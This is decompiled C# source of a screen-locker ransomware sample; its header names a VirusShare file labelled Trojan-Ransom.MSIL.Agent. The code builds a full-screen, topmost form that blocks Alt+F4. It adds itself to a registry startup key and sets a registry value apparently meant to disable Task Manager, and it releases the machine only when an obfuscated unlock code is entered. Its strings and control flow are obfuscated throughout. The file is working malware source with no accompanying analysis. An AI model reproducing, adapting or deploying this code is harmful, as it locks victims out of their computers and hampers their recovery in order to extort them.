// Decompiled with JetBrains decompiler
// Type: ariec.ariapalach
// Assembly: geartie, Version=1.2.2.9, Culture=neutral, PublicKeyToken=null
// MVID: 2F07859E-6C6C-475D-98E8-A6868943E85B
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00060-msil\Trojan-Ransom.MSIL.Agent.n-c7d050903f131aa4a16a59638cafecc942f45e81.exe

using Microsoft.Win32;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Threading;
using System.Windows.Forms;

namespace ariec
{
  public class ariapalach : Form
  {
    private IContainer \u0030;
    private TextBox \u0030;
    private Button \u0030;
    private Label \u0030;
    private Label \u0031;

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.\u0030 != null)
        goto label_2;
label_1:
      base.Dispose(disposing);
      return;
label_2:
      this.\u0030.Dispose();
      goto label_1;
    }

    private void \u0030()
    {
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (ariapalach));
      this.\u0030 = new TextBox();
      this.\u0030 = new Button();
      this.\u0030 = new Label();
      this.\u0031 = new Label();
      this.SuspendLayout();
      componentResourceManager.ApplyResources((object) this.\u0030, \u003F0\u003F.\u003F1\u003F("gŬɦͤ"));
      this.\u0030.BorderStyle = BorderStyle.FixedSingle;
      this.\u0030.Name = \u003F0\u003F.\u003F1\u003F("gŬɦͤ");
      componentResourceManager.ApplyResources((object) this.\u0030, \u003F0\u003F.\u003F1\u003F("LłɅ͇ѓ"));
      this.\u0030.BackColor = SystemColors.AppWorkspace;
      this.\u0030.Name = \u003F0\u003F.\u003F1\u003F("LłɅ͇ѓ");
      this.\u0030.UseVisualStyleBackColor = false;
      this.\u0030.Click += new EventHandler(this.\u0031);
      componentResourceManager.ApplyResources((object) this.\u0030, \u003F0\u003F.\u003F1\u003F("jŤɦͦѮ\u0530"));
      this.\u0030.BackColor = System.Drawing.Color.Transparent;
      this.\u0030.ForeColor = SystemColors.ControlText;
      this.\u0030.Name = \u003F0\u003F.\u003F1\u003F("jŤɦͦѮ\u0530");
      this.\u0030.Click += new EventHandler(this.\u0032);
      componentResourceManager.ApplyResources((object) this.\u0031, \u003F0\u003F.\u003F1\u003F("jŤɦͦѮԳ"));
      this.\u0031.BackColor = System.Drawing.Color.Transparent;
      this.\u0031.Name = \u003F0\u003F.\u003F1\u003F("jŤɦͦѮԳ");
      this.\u0031.Click += new EventHandler(this.\u0033);
      this.AcceptButton = (IButtonControl) this.\u0030;
      componentResourceManager.ApplyResources((object) this, \u003F0\u003F.\u003F1\u003F("!ŰɫͫѲ"));
      this.AutoScaleMode = AutoScaleMode.Font;
      this.Controls.Add((Control) this.\u0031);
      this.Controls.Add((Control) this.\u0030);
      this.Controls.Add((Control) this.\u0030);
      this.Controls.Add((Control) this.\u0030);
      this.FormBorderStyle = FormBorderStyle.None;
      this.KeyPreview = true;
      this.MinimizeBox = false;
      this.Name = \u003F0\u003F.\u003F1\u003F("kŻɡͦѶդ٨ݢ\u0861३");
      this.ShowIcon = false;
      this.ShowInTaskbar = false;
      this.TopMost = true;
      this.WindowState = FormWindowState.Maximized;
      this.Load += new EventHandler(this.\u0030);
      this.ResumeLayout(false);
      this.PerformLayout();
    }

    public ariapalach()
    {
      if (144454 <= Screen.PrimaryScreen.Bounds.Height + Screen.PrimaryScreen.Bounds.Width)
        return;
      this.\u0030();
      this.KeyPreview = true;
    }

    protected override void OnKeyDown(KeyEventArgs e)
    {
      if (10654 <= Screen.PrimaryScreen.Bounds.Height + Screen.PrimaryScreen.Bounds.Width)
        return;
      base.OnKeyDown(e);
      if (e.KeyCode != Keys.F4 || !e.Alt)
        return;
      e.Handled = true;
    }

    public static void sccrapkis()
    {
      if (!(Control.DefaultBackColor.ToString() != \u003F0\u003F.\u003F1\u003F("ašɷ͡Ѧդٯ")))
        return;
      string str = \u003F0\u003F.\u003F1\u003F("@ŽɷͤѸկٿݩࡗे\u0A60୫\u0C75൩\u0E76ཫၥᅶቝ");
      string executablePath = Application.ExecutablePath;
      RegistryKey subKey = Registry.CurrentUser.CreateSubKey(str + \u003F0\u003F.\u003F1\u003F("@ŌɳͷѼո١ݦࡈॐ੧ୣౢ൪\u0E60ཹၚᅮቸ\u137Aᑡᕨᙨ\u1759ᡖ\u1976ᩬ᭝"));
      try
      {
        subKey.SetValue(\u003F0\u003F.\u003F1\u003F("tŰɫͬѬձٵ"), (object) executablePath);
        subKey.Close();
      }
      catch
      {
      }
    }

    public static void salerer()
    {
      string str = \u003F0\u003F.\u003F1\u003F("|Ŧɵͮѯժٮݭ");
      if (Screen.PrimaryScreen.Bounds.Width <= 1)
        return;
      Process.Start(\u003F0\u003F.\u003F1\u003F("dūɡ̪Ѧպ٤"), \u003F0\u003F.\u003F1\u003F(",Łȡ") + str + \u003F0\u003F.\u003F1\u003F("4ļɴ̱пզ٣ܭ\u0869ॳ\u0A7A\u0B65౧\u0D75\u0E63ཷဪᅦቺ፤"));
    }

    public static void sell() => Application.Exit();

    public static void egsw()
    {
      string str = \u003F0\u003F.\u003F1\u003F("0");
      string subkey = \u003F0\u003F.\u003F1\u003F("Eźɲͧѥհ٢ݪࡒी\u0A65୨\u0C78൦\u0E7Bཨၠᅱቘፔᑫᕯ") + \u003F0\u003F.\u003F1\u003F("Gōɖ͓у՝٨ݮ\u0869ॿ\u0A77୬ు\u0D73\u0E67ཧၺᅽቿፌᑟᕡᙡᝥᡨᥣᩬ᭻ᱛᵕṼί\u2077Ⅷ≬");
      try
      {
        RegistryKey subKey = Registry.CurrentUser.CreateSubKey(subkey);
        subKey.SetValue(\u003F0\u003F.\u003F1\u003F("JŤɿͪѨե٭ݓ\u0867ॶ੯\u0B4E\u0C65\u0D73"), (object) str);
        subKey.Close();
      }
      catch (Exception ex)
      {
        if (34 <= Screen.PrimaryScreen.Bounds.Width)
          return;
        ariapalach.sell();
      }
    }

    public static void eef3e()
    {
    }

    private void \u0030(object _param1, EventArgs _param2)
    {
      Thread.Sleep(60);
      if (Screen.PrimaryScreen.Bounds.Width > 350)
        goto label_4;
label_3:
      ariapalach.sccrapkis();
      Application.DoEvents();
      ariapalach.egsw();
      Application.DoEvents();
      return;
label_4:
      this.TopMost = true;
      this.WindowState = FormWindowState.Maximized;
      this.Width = Screen.PrimaryScreen.Bounds.Width;
      this.Height = Screen.PrimaryScreen.Bounds.Height;
      if (38 < Screen.PrimaryScreen.Bounds.Width)
      {
        ariapalach.salerer();
        int num = 0;
        while (num < (int) byte.MaxValue)
          ++num;
        goto label_3;
      }
      else
        goto label_3;
    }

    private void \u0031(object _param1, EventArgs _param2)
    {
      if (this.\u0030.Text == \u003F0\u003F.\u003F1\u003F("oŭɭ"))
      {
        Process.Start(\u003F0\u003F.\u003F1\u003F("TĬɉ̓Ѻռٵݿ\u0878ॽੑ୩\u0C73ൺ\u0E65ཧၵᅣቷጪᑦᕺᙤ"));
        RegistryKey subKey1 = Registry.CurrentUser.CreateSubKey(\u003F0\u003F.\u003F1\u003F("}łɊ͟ѝՈ݂ٚ\u087A२੍ୀ\u0C50ൎ๓\u0F70ၸᅩቀፌᑳᕷᙼ\u1778ᡡᥦᩈ᭐ᱧᵣṢὪ\u2060ⅹ≚⍮\u2478╺♡❨⡨⥙⩖⭶ⱬⵝ"));
        try
        {
          string str = \u003F0\u003F.\u003F1\u003F("mŪɮ");
          subKey1.DeleteValue(\u003F0\u003F.\u003F1\u003F("qŷ") + str + \u003F0\u003F.\u003F1\u003F("qŵ"));
          subKey1.Close();
        }
        catch
        {
        }
        string str1 = \u003F0\u003F.\u003F1\u003F("`űɳ͢Ѱդ");
        int num = 5;
        string subkey = \u003F0\u003F.\u003F1\u003F("QŮ") + str1 + \u003F0\u003F.\u003F1\u003F("mŽɆ͍џՃ٘݅ࡏड़\u0A7Bୱౌൊ็ཌྷၖᅓቃ፝ᑨᕮᙩ\u177Fᡷᥬᩁ᭳ᱧᵧṺώⁿ⅌≟⍡\u2461╥♨❣⡬⥻⩛⭕ⱼ\u2D77\u2E77⽧ぬ");
        try
        {
          RegistryKey subKey2 = Registry.CurrentUser.CreateSubKey(subkey);
          subKey2.SetValue(\u003F0\u003F.\u003F1\u003F("JŤɿͪѨե٭ݓ\u0867ॶ੯\u0B4E\u0C65\u0D73"), (object) (num - 5).ToString());
          subKey2.Close();
        }
        catch (Exception ex)
        {
        }
        ariapalach.sell();
      }
      else
      {
        if (10653 <= Screen.PrimaryScreen.Bounds.Height + Screen.PrimaryScreen.Bounds.Width + 10)
          return;
        string str2 = \u003F0\u003F.\u003F1\u003F("аԶٕ݂<");
        string str3 = \u003F0\u003F.\u003F1\u003F("аԱ");
        int num = (int) MessageBox.Show(\u003F0\u003F.\u003F1\u003F("М") + str2 + \u003F0\u003F.\u003F1\u003F("пԿȥܾ=Ķؠ"), \u003F0\u003F.\u003F1\u003F("Т") + str3 + \u003F0\u003F.\u003F1\u003F("аԲȠ"));
      }
    }

    private void \u0032(object _param1, EventArgs _param2)
    {
      if (67 <= Screen.PrimaryScreen.Bounds.Height)
        return;
      Application.Exit();
    }

    private void \u0033(object _param1, EventArgs _param2)
    {
      ariapalach.egsw();
      Application.DoEvents();
    }
  }
}
